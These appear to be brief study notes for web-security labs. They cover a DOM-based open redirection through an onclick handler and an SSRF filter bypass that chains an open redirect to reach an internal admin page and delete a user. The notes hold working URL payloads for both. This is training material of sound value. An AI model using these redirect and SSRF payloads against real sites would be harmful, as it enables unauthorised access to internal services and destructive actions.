## XSS Vulnerabilities:
**Things to look for:
- Ctrl+F to find event listener, then use the following payloads in exploit server.
	- ==DOM-based open redirection== - page source contains: \<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog\</a>
		Visiting the following link solves the lab by taking the user to the exploit server
	  https:/lab_id.web-security-academy.net/post?postId=4&url=https://exploit_id.exploit-server.net/

## SSRF Vulnerabilities:
- ==SSRF with filter bypass via open redirection vulnerability== Find that there is a next product endpoint that takes the user to the next endpoint
  Use the stock check endpoint to generate an open redirect:
  /product/nextProduct?path=http://192.168.0.12:8080/admin
  stockApi=%2Fproduct%2FnextProduct?currentProductId53D1%26path%3Dhttp%3A%2F%2F192.168.0.12:8080%2Fadmin%2Fdelete?username=carlos




